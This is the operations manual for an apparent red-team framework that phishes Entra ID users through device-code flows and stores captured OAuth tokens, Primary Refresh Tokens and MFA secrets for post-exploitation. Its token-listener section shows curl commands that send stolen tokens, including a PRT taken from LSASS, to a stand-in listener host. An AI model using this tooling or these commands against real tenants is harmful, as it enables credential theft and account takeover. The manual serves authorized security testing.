# Configuration & Operations

## Setup and configuration

### Requirements

- Go 1.24+ (or Docker, see [deployment](../README.md#deployment))
- Outbound HTTPS to `login.microsoftonline.com`, `graph.microsoft.com`, `mysignins.microsoft.com`, `enterpriseregistration.windows.net`
- An SMTP account for sending phishing emails

### Build

```bash
go build -o entraith ./cmd/entraith
```

The binary embeds all HTML at compile time via `go:embed`. At runtime it needs only the config file and the SQLite database, which is created on first run.

### Config file

```ini
# Engagement metadata
engagement.id         = CORP-2026-RTO-001
engagement.operator   = operator
engagement.client_code = CORPX

# Server
server.host = 0.0.0.0
server.port = 8443
server.secure_cookies = true        # mark session cookies Secure (default true)
server.tls            = false        # terminate TLS in-process instead of behind a proxy
server.cert_file      =              # PEM cert, required when server.tls = true
server.key_file       =              # PEM key, required when server.tls = true
server.ip_allowlist   =              # comma-separated IPs/CIDRs allowed to reach the console (empty = all)

# Encryption at rest (optional). If unset, a key is generated at
# <parent of artifacts_path>/.entraith.key on first run. See docs/security.md.
auth.secret_key       =

# Azure AD / Entra ID
campaign.tenant_id    = common
campaign.client_id    = d3590ed6-52b3-4102-aeff-aad2292ab01c
campaign.scope        = https://graph.microsoft.com/.default offline_access openid profile
campaign.poll_interval = 5
campaign.capture_v1   = false        # use v1 endpoints (resource=) instead of v2 (scope=)
campaign.require_mfa  = false        # force MFA during the device-code auth

# Storage (created automatically if missing)
storage.artifacts_path = /opt/entraith/data/artifacts
storage.exports_path   = /opt/entraith/data/exports

# Token listener (optional) — standalone OAuth token intake server
listener.token_port       = 8000     # intake port (default 8000)
listener.token_autostart  = false    # start the intake server at boot
listener.default_campaign =          # campaign for tokens without a campaign_id
```

The SQLite database is created at `<parent of artifacts_path>/entraith.db`.

### Server, TLS and access

The console is meant to run behind a TLS-terminating reverse proxy (Caddy or nginx), which is why `server.tls` defaults to off and the server speaks plain HTTP to the proxy. Set `server.tls = true` with `cert_file`/`key_file` if you want the binary to terminate TLS itself.

`server.secure_cookies` is on by default. Leave it on whenever there is TLS in the path (proxy or in-process). Browsers also send Secure cookies over `http://localhost`, so local testing works. Turn it off only when reaching the console over plain HTTP on a non-localhost address.

`server.ip_allowlist` restricts the operator console (login, dashboard, API, webhook controls) to the listed IPs or CIDRs. The target-facing endpoints (`/qr`, `/intune`, `/receive`, `/capture`) stay open so phishing and beacon callbacks still work. Anything from a non-listed source gets a 404. Empty means no restriction.

Encryption of secrets at rest is always on. The key comes from `auth.secret_key` if set, otherwise from an auto-generated key file. Details and caveats are in [docs/security.md](security.md).

### Campaign options

`campaign.scope` is the v2 scope string. If you set it to a bare resource URL or URN, the engine switches to the v1 endpoints automatically, so `campaign.capture_v1` is only needed to force v1 behavior explicitly. v1 sends `resource=` instead of `scope=`, which matters for some resources and for the shape of the captured token.

`campaign.require_mfa` adds claims that force MFA during the device-code authentication.

### Reserved keys

`engagement.retention_days`, `database.dsn`, and `campaign.poll_timeout` are parsed but not currently wired to anything. Leave them out unless you are implementing the matching behavior.

### Known public client IDs

| Application | Client ID |
|-------------|-----------|
| Microsoft Office | `d3590ed6-52b3-4102-aeff-aad2292ab01c` |
| Azure CLI | `04b07795-8ddb-461a-bbee-02f9e1bf7b46` |
| Microsoft Teams | `1fec8e78-bce4-4aaf-ab1b-5451cc387264` |
| Azure PowerShell | `1950a258-227b-4e31-a9cf-717495945fc2` |

Using `common` as `tenant_id` accepts authentication from any Azure AD tenant.

### Starting the server

```bash
./entraith server --config engagement.conf
./entraith server --config engagement.conf --debug   # also log request/response bodies
```

```bash
./entraith validate --config engagement.conf     # check config without starting
./entraith reset-admin --config engagement.conf   # reset admin password if locked out
./entraith version
```

`--debug` logs full HTTP request and response bodies, which includes captured tokens. Use it for troubleshooting only, never on a live engagement box.

On first run, a random admin password is printed to stdout:

```
╔══════════════════════════════════════════════╗
║      FIRST RUN — ADMIN CREDENTIALS           ║
║  Username : admin                            ║
║  Password : <random 16-char password>        ║
╚══════════════════════════════════════════════╝
```

Navigate to `http://<host>:<port>/login` and authenticate before accessing the console.

---


## User roles and access control

Entraith supports two roles: `admin` and `operator`.

| Capability | `admin` | `operator` |
|------------|---------|------------|
| Create / manage user accounts | ✓ | — |
| Reset another user's password | ✓ | — |
| View all campaigns | ✓ | own only |
| View all sender profiles | ✓ | own only |
| Full post-exploitation access | ✓ | ✓ |

### First login

The initial `admin` account credentials are printed to stdout on first run. A user whose account was created by an admin (or whose password was reset) must **change their password on first login**. A modal blocks the UI until the new password is set.

### User management (admin only)

The **Users** button appears in the top navigation bar for admin sessions. From the Users panel, admins can:

- Create a new `operator` or `admin` account — a strong random password is auto-generated and displayed once.
- Reset any user's password — generates a new random password; the user is forced to change it at next login.
- Delete any non-admin account.

### Campaign and profile ownership

When an operator creates a campaign or sender profile, their user ID is recorded as `owner_id`. Operators only see their own campaigns and profiles. Admins see everything. Campaigns created before the RBAC migration have an empty `owner_id` and are visible to all operators.

---


## Persistence and database

All operator data is stored in a single SQLite database (`entraith.db`). WAL mode, foreign keys enforced.

### Schema

```
campaigns        — campaign metadata (id, name, status, timestamps, owner_id)
targets          — import list per campaign (CASCADE)
device_codes     — issued device codes per campaign (CASCADE)
tokens           — captured OAuth tokens per campaign (CASCADE)
email_results    — per-target email send outcomes (CASCADE)
qr_scans         — confirmed QR scan events per campaign (CASCADE)
intune_tokens    — per-target Intune landing page tokens (CASCADE)
intune_captures  — captured Intune OAuth flow events per campaign (CASCADE)
sender_profiles  — SMTP accounts (owner_id scoped to operator)
email_templates  — phishing HTML templates (global)
sessions         — operator login sessions (expiry-based)
users            — operator accounts (username, password hash, role, must_change_password)
device_certs     — registered virtual devices (global)
prts             — Primary Refresh Tokens (global)
winhello_keys    — Windows Hello for Business NGC keys (global)
otp_secrets      — stored TOTP secrets for live code generation (global)
request_templates — saved custom Graph request templates (global)
deployed_artifacts — deployment ledger: every mutation pushed into a target
                     tenant, with rollback descriptor + detection signature
                     (campaign_id optional, so global tools are logged too)
```

### Startup behaviour

1. Sender profiles and email templates are loaded into `mailer.Manager`.
2. All campaigns (targets, tokens, email results) are loaded into `campaigns.Manager`.
3. Any campaign that was `running` at shutdown is marked `aborted` — polling goroutines cannot survive a restart.

### Export format

`GET /api/campaigns/{id}/export` downloads a JSON evidence package:

```json
{
  "campaign": { "id": "...", "name": "...", "status": 4, ... },
  "targets": [ { "id": "...", "email": "...", ... } ],
  "device_codes": [ { "device_code": "...", "user_code": "ABCD-EFGH", ... } ],
  "tokens": [
    {
      "campaign_id": "...", "target_id": "...", "target_email": "jsmith@corp.com",
      "access_token": "eyJ...", "refresh_token": "0.AX...",
      "id_token": "eyJ...", "upn": "jsmith@corp.com",
      "redeemed_at": "2026-03-11T14:03:47Z"
    }
  ],
  "email_results": [ { "target_email": "...", "success": true, "sent_at": "..." } ],
  "exported_at": "2026-03-11T15:00:00Z"
}
```

---


## Webhook listener

**Built-in endpoint (`POST /receive`)** — always available on the main Entraith port. Accepts any JSON payload; logs to `webhook_log_path`.

**Standalone listener** — a secondary HTTP server on a configurable port, managed from the **Broker** tab inside any campaign view. Enter the desired port (default 9000) and click **Start**. Accepts POST requests on **any path** so the callback URL on the target side can be arbitrary. The port is bound synchronously — if the port is already in use, an error is returned immediately.

Both modes share the same log file. The standalone listener state is in-memory only — restart manually after a server restart.

### Content-Type behaviour

| `Content-Type` | Behaviour |
|----------------|-----------|
| `application/json` | Body is validated as JSON, stored and displayed with syntax highlighting |
| `application/json-raw` | Body is read as-is without parsing — useful for non-standard or binary-adjacent payloads |

### Log format

```
[2026-03-13T14:00:00Z] source=10.0.0.5:54321 method=POST path=/receive format=json payload={"event":"beacon","host":"WORKSTATION-01"}
```

The **Broker** tab polls `GET /webhook/logs` and renders the last 100 entries as formatted cards showing timestamp, source IP, HTTP method, path, and syntax-highlighted JSON payload.

---

## Token listener

The token listener is a **standalone HTTP server**, separate from both the operator console and the webhook/broker listener, that receives OAuth tokens pushed in from an external source — an AiTM / reverse proxy (evilginx-style), a phishing landing page, or a manual drop — and **ingests them into a campaign**. An ingested token is stored exactly like a device-code capture (in memory + encrypted at rest in the database), so it shows up under the campaign's **Tokens** tab and is immediately usable by every post-exploitation tool (Graph, MFA, PRT, token exchange).

Configure it with the `listener.*` keys above, or drive it at runtime from the **Broker** tab (the *Token Listener* panel) or the control API.

### Intake endpoint

The intake server listens on its own port (default `8000`) and exposes:

| Method | Path | Purpose |
|--------|------|---------|
| `POST` | `/token` (or any path) | Ingest one token payload |
| `GET`  | `/health` | Liveness probe |

The intake endpoint is **unauthenticated by design** — the whole point is that an external component can POST to it. Bind it to an interface/port that only your infrastructure can reach, or front it with a redirector.

### Payload

`POST /token` accepts either `application/json` (default) or `application/x-www-form-urlencoded`, selected by `Content-Type`. Fields:

| Field | Required | Notes |
|-------|----------|-------|
| `access_token` / `refresh_token` / `id_token` | at least one | Captured token material |
| `token_type`, `expires_in`, `scope` | no | Copied through as-is |
| `campaign_id` | no* | Target campaign; falls back to `listener.default_campaign` |
| `target_id` / `target_email` | no | Match an existing target; otherwise a target is auto-created |
| `source` | no | Free-form origin label (e.g. `aitm`, `phish-page`) |

\* A `campaign_id` (in the payload) or a configured `default_campaign` is required — otherwise the token is rejected with `400` and logged as `no_campaign`.

**Target resolution:** `target_id` match → `target_email` (or the UPN/email from the JWT) match → auto-create a new target (group `captured`) from the JWT's `upn`/`preferred_username`/`email` and `tid` claims.

### PRT intake

A Primary Refresh Token is **not** a bearer token, so it takes a different path: send `prt` (or `prt_token`) and the listener stores it **complete** in the PRT vault (`primary_refresh_tokens`, encrypted at rest) instead of the campaign token store. It then appears under the **PRTs** list and every PRT operation can use it — mint an access token (`POST /api/prts/{id}/access-token`), build an SSO cookie (`POST /api/prts/{id}/cookie`), and from a minted Graph token, drive Graph Actions.

| Field | Required | Notes |
|-------|----------|-------|
| `prt` / `prt_token` | yes | The Primary Refresh Token |
| `session_key` | for minting | The derived/clear session key; required to sign assertions (mint tokens / cookie). The PRT is stored without it, but can't be exchanged |
| `upn`, `tenant_id` | recommended | Stored with the PRT; `upn` also names the auto-created target on exchange |
| `device_cert_id`, `label` | no | Associate a device cert / label the vault entry |
| `campaign_id` | no | If present **and** a session key is supplied, the PRT is auto-exchanged for a Graph access token that is ingested into the campaign, so it is usable in Graph Actions immediately |
| `client_id`, `resource` | no | Exchange overrides — default to Office client / `https://graph.microsoft.com` |

A PRT intake always stores the PRT first; a failed auto-exchange (e.g. wrong session key) is reported in the response as `exchange_error` but the PRT is kept. Response: `{status:"prt_stored", prt_id, label, has_session_key, exchanged?, campaign_id?, target_id?, target_email?, exchange_error?}`.

Example (PRT captured from LSASS/CloudAP, stored and auto-used in a campaign):

```bash
curl -X POST http://LISTENER_HOST:8000/token \
  -H 'Content-Type: application/json' \
  -d '{"prt":"0.AX...","session_key":"...","upn":"ceo@contoso.com",
       "tenant_id":"<tid>","campaign_id":"camp-123","source":"cloudap-lsass"}'
```

Example (evilginx / AiTM style):

```bash
curl -X POST http://LISTENER_HOST:8000/token \
  -H 'Content-Type: application/json' \
  -d '{"access_token":"eyJ...","refresh_token":"0.AX...","campaign_id":"camp-123","source":"aitm"}'
```

### Audit log

Every intake attempt is written to `token_listener.log` under `storage.artifacts_path` as a `token_ingest` entry. Token material is **redacted** in this log — only a short prefix and length are recorded (`eyJhbGciOiAi…(len=308)`); the usable token lives encrypted at rest in the database, never in the plaintext log.

### State

The listener state (running/port/counters) is in-memory only. After a server restart it is stopped unless `listener.token_autostart = true`. Already-ingested tokens survive the restart because they are persisted to the database.

---

